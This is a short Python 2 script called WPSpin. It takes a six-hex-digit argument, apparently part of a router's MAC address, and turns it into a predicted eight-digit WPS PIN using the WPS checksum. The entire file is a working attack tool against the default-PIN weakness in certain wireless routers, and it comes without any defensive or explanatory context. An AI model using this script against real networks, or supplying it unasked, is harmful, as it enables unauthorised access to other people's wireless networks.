
import sys
 
VERSION    = 1
SUBVERSION = 0
 
def usage():
    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
    print "[*] Usage : python WPSpin.py 123456"
    sys.exit(0)
 
def wps_pin_checksum(pin):
    accum = 0
 
    while(pin):
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return  (10 - accum % 10) % 10
 
try:
    if (len(sys.argv[1]) == 6):
        p = int(sys.argv[1] , 16) % 10000000
        print "[+] WPS pin might be : %07d%d" % (p, wps_pin_checksum(p))
    else:
        usage()
except Exception:
    usage()

